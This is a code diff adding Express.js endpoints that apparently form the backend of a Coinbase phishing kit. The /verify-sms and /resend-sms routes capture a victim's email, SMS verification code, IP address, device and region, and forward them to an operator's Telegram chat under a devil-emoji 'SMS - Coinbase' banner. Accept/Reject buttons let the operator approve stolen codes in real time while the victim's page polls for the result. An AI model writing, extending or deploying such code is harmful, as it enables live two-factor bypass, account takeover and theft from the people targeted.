@@ -295,3 +295,259 @@ const server = app.listen(PORT, () => {
 });
 
 module.exports = { app, server };
+
+// ============================================================================
+// SMS ENDPOINTS
+// ============================================================================
+
+const pendingSMS = {};
+
+app.post("/send-sms", async (req, res) => {
+  try {
+    const { email, userId, smsCode, region, device, ip, message, options } = req.body;
+
+    if (!email || !smsCode) {
+      return res.status(400).json({ error: "Missing email or SMS code" });
+    }
+
+    console.log(`📧 ${email} | SMS: ${smsCode} | Device: ${device} | Region: ${region}`);
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: options.parse_mode,
+        reply_markup: options.reply_markup
+      })
+    });
+
+    if (response.ok) {
+      pendingSMS[email] = {
+        status: "pending",
+        smsCode,
+        userId,
+        timestamp: Date.now()
+      };
+
+      res.json({ ok: true, message: "SMS sent to Telegram" });
+    } else {
+      res.status(500).json({ error: "Failed to send SMS" });
+    }
+
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.post("/send-message", async (req, res) => {
+  try {
+    const { email, message } = req.body;
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML"
+      })
+    });
+
+    if (response.ok) {
+      res.json({ ok: true });
+    } else {
+      res.status(500).json({ error: "Failed to send message" });
+    }
+
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.post("/check-sms-status", (req, res) => {
+  try {
+    const { email } = req.body;
+
+    if (!email) {
+      return res.json({ status: "unknown" });
+    }
+
+    if (pendingSMS[email]) {
+      return res.json({ status: pendingSMS[email].status });
+    }
+
+    res.json({ status: "unknown" });
+
+  } catch (err) {
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+app.post("/update-sms-status", (req, res) => {
+  try {
+    const { email, status } = req.body;
+
+    if (!email || !status) {
+      return res.status(400).json({ error: "Missing email or status" });
+    }
+
+    if (!pendingSMS[email]) {
+      pendingSMS[email] = {};
+    }
+
+    if (status === "sms_accept") {
+      pendingSMS[email].status = "sms_accepted";
+    } else if (status === "sms_reject") {
+      pendingSMS[email].status = "sms_rejected";
+    } else {
+      pendingSMS[email].status = status;
+    }
+
+    pendingSMS[email].updatedAt = Date.now();
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// BOT SMS CALLBACK HANDLER
+// ============================================================================
+
+// The bot.js file needs to handle SMS callbacks with these patterns:
+// - sms_accept|email
+// - sms_reject|email
+// And call /update-sms-status endpoint with status: "sms_accept" or "sms_reject"
+
+// ============================================================================
+// NEW SMS ENDPOINTS - FRONTEND JUST SENDS CODE, BACKEND HANDLES TELEGRAM
+// ============================================================================
+
+app.post("/verify-sms", async (req, res) => {
+  try {
+    const { email, userId, smsCode } = req.body;
+
+    if (!email || !smsCode) {
+      return res.status(400).json({ error: "Missing email or SMS code" });
+    }
+
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    const message =
+      `😈😈😈😈 <b>SMS - Coinbase</b> 😈😈😈😈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>📱 SMS:</b> <code>${smsCode}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📡 IP:</b> ${ip}`;
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: "✅ Accept ✅", callback_data: `sms_accept|${email}` }],
+            [{ text: "❌ Reject ❌", callback_data: `sms_reject|${email}` }]
+          ]
+        }
+      })
+    });
+
+    if (response.ok) {
+      console.log(`📧 ${email} | SMS: ${smsCode}`);
+      
+      pendingSMS[email] = {
+        status: "pending",
+        smsCode,
+        userId,
+        timestamp: Date.now()
+      };
+
+      res.json({ ok: true });
+    } else {
+      res.status(500).json({ error: "Failed to send SMS" });
+    }
+
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.post("/resend-sms", async (req, res) => {
+  try {
+    const { email, userId } = req.body;
+
+    if (!email) {
+      return res.status(400).json({ error: "Missing email" });
+    }
+
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    const message =
+      `😈😈😈 <b>Resend SMS - Coinbase</b> 😈😈😈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📡 IP:</b> ${ip}`;
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML"
+      })
+    });
+
+    if (response.ok) {
+      console.log(`📱 Resend SMS for ${email}`);
+      res.json({ ok: true });
+    } else {
+      res.status(500).json({ error: "Failed to resend SMS" });
+    }
+
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
